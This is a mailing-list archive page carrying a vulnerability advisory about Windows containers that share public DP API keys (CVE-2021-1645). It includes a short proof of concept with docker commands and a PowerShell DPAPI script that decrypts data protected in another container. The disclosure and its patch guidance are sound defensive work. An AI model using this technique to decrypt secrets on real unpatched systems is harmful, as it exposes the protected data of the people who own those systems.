<!-- MHonArc v2.6.19 -->
<!--X-Head-End-->
<!DOCTYPE html>
<html lang="en">
<head>
<script async src="/site.js"></script>
<link rel="alternate" type="application/rss+xml" title="RSS" href="https://seclists.org/rss/fulldisclosure.rss">
<meta property="og:image" content="https://seclists.org/images/fulldisclosure-img.png" />
<link rel="image_src" href="https://seclists.org/images/fulldisclosure-img.png" />

<meta name="Subject" content="[CSA-2021-002] DP API ineffective in Windows containers"/>
<meta name="Author" content="Certitude - Advisories"/>
<title>Full Disclosure: [CSA-2021-002] DP API ineffective in Windows containers</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="theme-color" content="#2A0D45">
<link rel="preload" as="image" href="/images/sitelogo.png" imagesizes="168px" imagesrcset="/images/sitelogo.png, /images/sitelogo-2x.png 2x">
<link rel="preload" as="image" href="/shared/images/nst-icons.svg">
<link rel="stylesheet" href="/shared/css/nst.css?v=2">
<script async src="/shared/js/nst.js?v=2"></script>
<link rel="stylesheet" href="/shared/css/nst-foot.css?v=2" media="print" onload="this.media='all'">
<link rel="stylesheet" href="/site.css">
<!--Google Analytics Code-->
<link rel="preload" href="https://www.google-analytics.com/analytics.js" as="script">
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
ga('create', 'UA-11009417-1', 'auto');
ga('send', 'pageview');
</script>
<!--END Google Analytics Code-->
<META NAME="ROBOTS" CONTENT="NOARCHIVE">
<link rel="shortcut icon" href="/shared/images/tiny-eyeicon.png" type="image/png">
</head>
<body><div id="nst-wrapper">

<div id="menu">
 <div class="blur">
  <header id="nst-head">

    <a id="menu-open" href="#menu" aria-label="Open menu">
     <img width="44" height="44" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#menu">
    </a>
    <a id="menu-close" href="#" aria-label="Close menu">
     <img width="44" height="44" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#close">
    </a>

   <a id="nst-logo" href="/" aria-label="Home page">
    <img alt="Home page logo" srcset="/images/sitelogo.png, /images/sitelogo-2x.png 2x" src="/images/sitelogo.png" onerror="this.onerror=null;this.srcset=this.src" height=90 width=168></a>

   <nav id="nst-gnav">
    <a class="nlink" href="https://nmap.org/">Nmap.org</a>
    <a class="nlink" href="https://npcap.com/">Npcap.com</a>
    <a class="nlink" href="https://seclists.org/">Seclists.org</a>
    <a class="nlink" href="https://sectools.org">Sectools.org</a>
    <a class="nlink" href="https://insecure.org/">Insecure.org</a>
   </nav>

   <form class="nst-search" id="nst-head-search" action="/search/">
    <input class="nst-search-q" name="q" type="search" placeholder="Site Search">
    <button class="nst-search-button" title="Search">
     <img style="width:100%;aspect-ratio:1/1;" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#search">
     </button>
   </form>

  </header>
 </div>
</div>

<main id="nst-content">

<!--X-Body-Begin-->
<!--X-User-Header-->
<a href="/fulldisclosure/"><img src="/images/fulldisclosure-logo.png" width="80" class="l-logo right" alt="fulldisclosure logo"></a>
<h2 class="m-list"><a href="/fulldisclosure/">Full Disclosure</a>
mailing list archives</h2>
<!--X-User-Header-End-->
<!--X-TopPNI-->
<div class="nav-bar">
<div class="nav-link">
<a href="32"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="date.html#33">By Date</a>
<a href="34"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
<div class="nav-link">
<a href="32"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="index.html#33">By Thread</a>
<a href="34"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
<form class="nst-search center" action="/search/fulldisclosure">
<input class="nst-search-q" name="q" type="search" placeholder="List Archive Search">
<button class="nst-search-button" title="Search">
<img style="width:100%;aspect-ratio:1/1;" alt="" aria-hidden="true"
src="/shared/images/nst-icons.svg#search">
</button>
</form>

</div>

<!--X-TopPNI-End-->
<!--X-MsgBody-->
<!--X-Subject-Header-Begin-->
<h1 class="m-title">[CSA-2021-002] DP API ineffective in Windows containers</h1>
<hr>
<!--X-Subject-Header-End-->
<!--X-Head-of-Message-->


<em>From</em>: Certitude - Advisories &lt;advisories@certitude.consulting&gt;<br>

<em>Date</em>: Tue, 16 Mar 2021 07:55:36 +0000<br>

<!--X-Head-of-Message-End-->
<!--X-Head-Body-Sep-Begin-->
<hr>
<!--X-Head-Body-Sep-End-->
<!--X-Body-of-Message-->
<pre style="margin: 0em;">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~                Certitude Security Advisory - CSA-2021-002                   ~
~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~
 PRODUCT          : Windows Containers
 VENDOR           : Microsoft
 SEVERITY         : High
 AFFECTED VERSION : Windows 10, Windows Server
 IDENTIFIERS      : CVE-2021-1645
 PATCH VERSION    : KB4598229, KB4598230, KB4598242, KB4598243
 FOUND BY         : Marc Nimmerrichter, Certitude Lab
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Introduction
------------

Windows containers is a feature that extends the container concept well-known
from Linux environments to Windows. Just like containers on Linux, Windows
containers utilize a shared kernel but container processes are somewhat
isolated from one another.

The Windows Data Protection API (DP API) allows applications to encrypt
arbitrary data. An application does not have to manage keys, but instead, any
data can be passed to the API, which then returns an encrypted blob.
Similarly, an application can pass a previously encrypted blob to DP API to
retrieve the plain text. The cryptographic key used for these encryption
operations is either tied to the user context or is unique to a machine.

There was a design issue with DP API in containers which resulted in DP API
using the same key in all containers. Additionally, these keys were public in
base-image layers published by Microsoft.

Organizations using DP API inside containers should apply patches to Windows
and use the latest base images. However, the fix causes a design change, which
might render the use of DP API difficult for many use-cases.

Vulnerability Overview
----------------------

The vulnerability described applies to both, user- and machine-key DP API
encryption within Windows Docker containers. In our description we will use
machine key encryption, but the same issue exists if data is encrypted with
the user-key.

Normally, a machine key is tied to a (virtual-)machine. Therefore, a machine
is not able to decrypt data encrypted by an application on another machine.
However, due to a design issue, DP API machine keys used in containers came
from the container images. Since Windows docker images are based on the same
base images, the DP API keys of containers were identical. As the base image
is public, the DP API keys were public too!

Therefore, DP API operations performed by any Windows container application
were ineffective, as the encryption key that was used is public. Organizations
that used DP API in Windows Docker containers and relied on it to store
encrypted data in a potentially insecure location, should consider this data
as compromised.

Proof-of-Concept
----------------

First, start a docker container called Alice on VM1:

\$ docker run --name Alice -it
mcr.microsoft.com/dotnet/framework/runtime:4.8-windowsservercore-ltsc2019
cmd.exe

Then, encrypt a file in the Alice container using the powershell script
vault.ps1:

C:\&gt;powershell.exe -File vault.ps1 -StoreSecret &quot;This is my secret text&quot;
secret.txt

C:\&gt;type secret.txt
AQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAm+1a2TNbiEahEIB4y/C3vQAAAAACAAAAAAAQZgAAAAEAACAAAAAdbJ9ZanY929j39ZLgabsaE5hRS4TLkCaaaRqb
+n3ZXAAAAAAOgAAAAAIAACAAAAC7fHbsKHCTaMhsWIVMYwUZezbLozItcqExHdg9EJcfDiAAAABFv2EHA5TTqb8I9I+BZrfQS5ViD93KZlL4FoYIBldGY0AA
AABdx7adlANRnw1shJTOtE6cYTAeqmb1yTe9adcSY1nBvtqlqSWQ/zwGaqfIfumuUm+o+ySwZXH/Su5GovJ8aUP9

Start a docker container Bob on VM2:

\$ docker run --name Bob -it
mcr.microsoft.com/dotnet/framework/runtime:4.8-windowsservercore-ltsc2019
cmd.exe

The following command shows that the file encrypted by Alice on VM1 can be
decrypted in the Bob container on VM2:

C:\&gt;powershell.exe -File vault.ps1 secret.txt
This is my secret text

The vault.ps1 PowerShell script from
<a  rel="nofollow" href="https://blag.nullteilerfrei.de/2018/01/05/powershell-dpapi-script/">https://blag.nullteilerfrei.de/2018/01/05/powershell-dpapi-script/</a> used in
this PoC:

``` {.powershell```}
Param(
  [string] $StoreSecret,
  [Parameter(Mandatory=$True,Position=0)]
  [string] $filename )
[void] [Reflection.Assembly]::LoadWithPartialName(&quot;System.Security&quot;)
$scope = [System.Security.Cryptography.DataProtectionScope]::CurrentUser
if ($StoreSecret -eq &quot;&quot;) {
  $data = Get-Content $filename
  $ciphertext = [System.Convert]::FromBase64String($data)
  $plaintext = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $ciphertext, $null, $scope )
  [System.Text.UTF8Encoding]::UTF8.GetString($plaintext)
} else {
  $plaintext = [System.Text.UTF8Encoding]::UTF8.GetBytes($StoreSecret)
  $ciphertext = [System.Security.Cryptography.ProtectedData]::Protect(
    $plaintext, $null, $scope )
  [System.Convert]::ToBase64String($ciphertext) &gt; $filename
}
```

Resolution
----------

Microsoft fixed this vulnerability with a patch for Windows Server and Windows
10 operating systems and in their docker base-images. Users should apply both,
OS updates and base-image updates, to address this issue. Please also refer to
<a  rel="nofollow" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1645">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1645</a>.

However, the patch comes with a caveat: As the issue is a design problem, it
could not be fixed in a straightforward way. Windows containers now generate a
DP API key when the container is first started. This also means that all
containers use different keys. There is currently no supported way to share
keys between containers or transfer a key from one container to another. This
is impractical, because containers are often relatively short-lived. Moreover,
when a container is scaled up, new containers will not be able to work with
previously encrypted blobs. This reduces the potential use-cases of DP API
with containers.

References
----------

<a  rel="nofollow" href="https://certitude.consulting/blog/en/windows-docker-dp-api-vulnerability-cve-2021-1645/">https://certitude.consulting/blog/en/windows-docker-dp-api-vulnerability-cve-2021-1645/</a>
<a  rel="nofollow" href="https://certitude.consulting/advisories/CSA_2021_002_Windows_Docker_DP_API_Design_Vulnerability.md.txt">https://certitude.consulting/advisories/CSA_2021_002_Windows_Docker_DP_API_Design_Vulnerability.md.txt</a>
<a  rel="nofollow" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1645">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1645</a>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                                           (c) 2021 Certitude Consulting GmbH
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

_______________________________________________
Sent through the Full Disclosure mailing list
<a  rel="nofollow" href="https://nmap.org/mailman/listinfo/fulldisclosure">https://nmap.org/mailman/listinfo/fulldisclosure</a>
Web Archives &amp; RSS: <a  rel="nofollow" href="http://seclists.org/fulldisclosure/">http://seclists.org/fulldisclosure/</a>

</pre>
<!--X-Body-of-Message-End-->
<!--X-MsgBody-End-->
<!--X-Follow-Ups-->
<hr>
<!--X-Follow-Ups-End-->
<!--X-References-->
<!--X-References-End-->
<!--X-BotPNI-->
<div class="nav-bar">
<div class="nav-link">
<a href="32"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="date.html#33">By Date</a>
<a href="34"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
<div class="nav-link">
<a href="32"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="index.html#33">By Thread</a>
<a href="34"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
</div>
<h3 class="m-thread">Current thread:</h3>
<ul class="thread">
<li><strong>[CSA-2021-002] DP API ineffective in Windows containers</strong> <em>Certitude - Advisories (Mar 16)</em>
</ul>


<!--X-BotPNI-End-->
<!--X-User-Footer-->
<!--X-User-Footer-End-->
</main><!-- content -->

<footer id="nst-foot">
   <form class="nst-search" id="nst-foot-search" action="/search/">
    <input class="nst-search-q" name="q" type="search" placeholder="Site Search">
    <button class="nst-search-button" title="Search">
     <img style="width:100%;aspect-ratio:1/1;" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#search">
     </button>
   </form>
<div class="flexlists">
<div class="fl-unit">
<h2><a class="nlink" href="https://nmap.org/">Nmap Security Scanner</a></h2>
<ul>
<li><a class="nlink" href="https://nmap.org/book/man.html">Ref Guide</a>
<li><a class="nlink" href="https://nmap.org/book/install.html">Install Guide</a>
<li><a class="nlink" href="https://nmap.org/docs.html">Docs</a>
<li><a class="nlink" href="https://nmap.org/download.html">Download</a>
<li><a class="nlink" href="https://nmap.org/oem/">Nmap OEM</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://npcap.com/">Npcap packet capture</a></h2>
<ul>
<li><a class="nlink" href="https://npcap.com/guide/">User's Guide</a>
<li><a class="nlink" href="https://npcap.com/guide/npcap-devguide.html#npcap-api">API docs</a>
<li><a class="nlink" href="https://npcap.com/#download">Download</a>
<li><a class="nlink" href="https://npcap.com/oem/">Npcap OEM</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://seclists.org/">Security Lists</a></h2>
<ul>
<li><a class="nlink" href="https://seclists.org/nmap-announce/">Nmap Announce</a>
<li><a class="nlink" href="https://seclists.org/nmap-dev/">Nmap Dev</a>
<li><a class="nlink" href="https://seclists.org/fulldisclosure/">Full Disclosure</a>
<li><a class="nlink" href="https://seclists.org/oss-sec/">Open Source Security</a>
<li><a class="nlink" href="https://seclists.org/dataloss/">BreachExchange</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://sectools.org">Security Tools</a></h2>
<ul>
<li><a class="nlink" href="https://sectools.org/tag/vuln-scanners/">Vuln scanners</a>
<li><a class="nlink" href="https://sectools.org/tag/pass-audit/">Password audit</a>
<li><a class="nlink" href="https://sectools.org/tag/web-scanners/">Web scanners</a>
<li><a class="nlink" href="https://sectools.org/tag/wireless/">Wireless</a>
<li><a class="nlink" href="https://sectools.org/tag/sploits/">Exploitation</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://insecure.org/">About</a></h2>
<ul>
<li><a class="nlink" href="https://insecure.org/fyodor/">About/Contact</a>
<li><a class="nlink" href="https://insecure.org/privacy.html">Privacy</a>
<li><a class="nlink" href="https://insecure.org/advertising.html">Advertising</a>
<li><a class="nlink" href="https://nmap.org/npsl/">Nmap Public Source License</a>
</ul>
</div>
<div class="fl-unit social-links">
<a class="nlink" href="https://twitter.com/nmap" title="Visit us on Twitter">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#twitter" alt="" aria-hidden="true">
 </a>
<a class="nlink" href="https://facebook.com/nmap" title="Visit us on Facebook">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#facebook" alt="" aria-hidden="true">
 </a>
<a class="nlink" href="https://github.com/nmap/" title="Visit us on Github">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#github" alt="" aria-hidden="true">
 </a>
<a class="nlink" href="https://reddit.com/r/nmap/" title="Discuss Nmap on Reddit">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#reddit" alt="" aria-hidden="true">
 </a>
</div>
</div>
</footer>

</div><!-- wrapper -->
</body>
</html>

